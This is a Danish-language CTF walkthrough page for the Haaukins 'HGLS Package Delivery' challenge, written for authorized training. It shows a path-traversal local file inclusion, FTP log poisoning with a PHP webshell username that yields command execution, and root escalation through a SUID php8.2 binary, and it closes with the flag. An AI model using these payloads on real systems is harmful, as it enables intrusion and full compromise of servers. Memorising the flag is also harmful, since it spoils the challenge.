@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: HGLS Package Delivery — tutorial (LFI → FTP-log-poisoning RCE → SUID PHP root)</title>
+<meta name="description" content="Guide til Haaukins HGLS Package Delivery: en klassisk PHP-LFI kombineret med FTP-log-poisoning giver RCE, og en overset SUID-flagget php8.2-binary giver root.">
+<link rel="canonical" href="https://lolcatatonia.github.io/haaukins-walkthroughs/hgls-package-delivery.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Haaukins: HGLS Package Delivery — tutorial (LFI → FTP-log-poisoning RCE → SUID PHP root)">
+<meta property="og:description" content="Guide til Haaukins HGLS Package Delivery: en klassisk PHP-LFI kombineret med FTP-log-poisoning giver RCE, og en overset SUID-flagget php8.2-binary giver root.">
+<meta property="og:url" content="https://lolcatatonia.github.io/haaukins-walkthroughs/hgls-package-delivery.html">
+<meta name="twitter:card" content="summary">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "HGLS Package Delivery", "description": "Guide til Haaukins HGLS Package Delivery: en klassisk PHP-LFI kombineret med FTP-log-poisoning giver RCE, og en overset SUID-flagget php8.2-binary giver root.", "url": "https://lolcatatonia.github.io/haaukins-walkthroughs/hgls-package-delivery.html", "inLanguage": "da", "about": {"@type": "Thing", "name": "Haaukins CTF"}}</script>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>HGLS Package Delivery</h1>
+<p class="subtitle">LFI + en loggende FTP-server du selv kan skrive til = gratis RCE.</p>
+<div class="badges"><span class="badge cat">Web exploitation</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>LFI via kildekodelæk</h2>
+<p>Downloadbar <code>package/YourHGLSpackage.zip</code> indeholder PHP-kildekoden, som
+             afslører en klassisk Local File Inclusion:</p>
+             <pre><code>include("CJpersonal/".$_GET['CJSecretPackage']);</code></pre>
+             <pre><code>curl "http://hgls-delivery.hkn/index.php?CJSecretPackage=../../../../../../etc/passwd"</code></pre>
+             <p>Afslører bruger <code>woozie</code> (uid 1001) og en læsbar <code>/etc/shadow</code> (for
+             langsom at bruteforce med rimelig wordlist-indsats).</p>
+<h2>FTP-log-poisoning til RCE</h2>
+<p>Port 21 kører <code>vsftpd</code> med <code>xferlog_enable=YES</code> — den logger ALLE
+             loginforsøg råt, inklusive brugernavnet, til <code>/var/log/vsftpd.log</code>, som er
+             LFI-inkluderbar:</p>
+             <pre><code># 1) "log ind" med en PHP-payload som brugernavn (login fejler, men logges)
+s.sendall(b'USER &lt;?php system($_GET["cmd"]); ?&gt;\r\n')
+s.sendall(b'PASS x\r\n')</code></pre>
+             <pre><code># 2) inkludér loggen via LFI, send kommando via en ekstra GET-parameter
+curl "http://hgls-delivery.hkn/index.php?CJSecretPackage=../../../../../../var/log/vsftpd.log&amp;cmd=id"
+# uid=1001(woozie) groups=1001(woozie),4(adm)</code></pre>
+<h2>Privesc: en overset SUID php8.2</h2>
+<pre><code>find / -perm -4000 -type f 2&gt;/dev/null
+# /usr/bin/php8.2  -rwsr-sr-x root root</code></pre>
+             <p>En setuid-root PHP-binary. Direkte privesc virker ikke bare ved at kalde
+             <code>system()</code> — PHP's <code>shell_exec()</code>/<code>system()</code> dropper
+             automatisk til den rigtige uid (1001) i barneprocessen. Løsningen er at synkronisere
+             effektiv/reel uid EKSPLICIT med <code>posix_setuid(0)</code> FØR man kalder ud til en
+             shell:</p>
+             <pre><code>/usr/bin/php8.2 -r "posix_setuid(0); system(\"id\");"
+# uid=0(root) gid=1001(woozie) groups=1001(woozie),4(adm)</code></pre>
+             <p>Flaget lå under et ikke-standard filnavn i <code>/root/</code>, fundet via
+             <code>find / -iname "*flag*"</code> kørt som root via samme teknik.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">HKN{h3r3-15-y0ur-pr3c10u5-p4ck463}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>En loggende, skrivbar service (FTP, mail, SSH-banner) der også er LFI-inkluderbar er en klassisk log-poisoning-RCE-kombination.</li><li>En SUID-flagget sprogtolk (php, python, perl) giver effektiv root ved start, men almindelige exec-funktioner dropper ofte privilegierne igen — synkronisér uid EKSPLICIT (posix_setuid(0)) før du kalder ud til et shell.</li><li>find / -iname "*flag*" fanger ikke-standard filnavne som ren "find /root -name flag.txt" ville misse.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
